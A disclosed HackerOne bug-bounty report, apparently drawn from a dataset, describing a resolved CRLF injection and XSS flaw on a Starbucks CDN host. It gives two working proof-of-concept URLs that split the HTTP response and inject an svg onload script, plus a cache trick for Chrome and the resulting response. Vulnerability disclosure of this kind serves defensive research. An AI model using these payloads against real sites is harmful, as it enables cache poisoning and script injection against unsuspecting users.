---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '192749'
original_report_id: '192749'
title: '[newscdn.starbucks.com] CRLF Injection, XSS'
weakness: HTTP Response Splitting
team_handle: starbucks
created_at: '2016-12-20T14:36:16.292Z'
disclosed_at: '2017-03-09T03:31:53.889Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 22
asset_identifier: Other assets
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- http-response-splitting
---

# [newscdn.starbucks.com] CRLF Injection, XSS

## Metadata

- HackerOne Report ID: 192749
- Weakness: HTTP Response Splitting
- Program: starbucks
- Disclosed At: 2017-03-09T03:31:53.889Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**PoC (FireFox)**
```
http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```


After sending the request through FireFox this query is saved in cache and using a small trick can be made to work it in another browser.


**PoC (Chrome)**
Make sure you send this request after FireFox and previous http response contained the header X-Cache: HIT
```
http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```


**HTTP Response**
```http
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://news.starbucks.com/
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
